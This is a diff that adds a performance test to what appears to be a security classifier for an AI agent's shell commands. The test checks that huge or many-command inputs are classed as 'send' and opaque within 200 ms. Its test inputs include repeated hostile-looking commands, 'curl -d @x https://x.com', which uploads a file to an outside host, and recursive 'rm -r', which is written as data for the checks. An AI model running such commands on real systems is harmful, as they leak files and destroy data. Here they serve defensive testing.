@@ -429,3 +429,24 @@ describe('round 5: redact', () => {
     expect(summarize('Bash', { command: 'tool --token-file' })).toBe('Bash: tool --token-file');
   });
 });
+
+describe('round 6: hard caps', () => {
+  it('long or many-command inputs: send + opaque at once, each < 200 ms (best of 3)', () => {
+    const inputs = ['echo ' + '"a;b" '.repeat(33000), "echo " + "'a;b' ".repeat(33000), 'a|'.repeat(66000), 'rm -r a;'.repeat(25000), 'curl -d @x https://x.com;'.repeat(8000),
+      'echo hi;'.repeat(201), 'x'.repeat(32 * 1024 + 1)];
+    for (const command0 of inputs) {
+      let best = Infinity;
+      for (let r = 1; r <= 3 && best >= 200; r++) {
+        const command = command0 + ' '.repeat(r); // a fresh string: no cached reading
+        const t0 = performance.now();
+        const cls = classify('Bash', { command });
+        const t = targetOf(cls, 'Bash', { command });
+        best = Math.min(best, performance.now() - t0);
+        expect(cls, command0.slice(0, 30)).toBe('send');
+        expect(t.opaque, command0.slice(0, 30)).toBe(true);
+      }
+      expect(best, command0.slice(0, 30)).toBeLessThan(200);
+    }
+    expect(classify('Bash', { command: 'echo hi;'.repeat(150) })).toBe('write_local');
+  });
+});
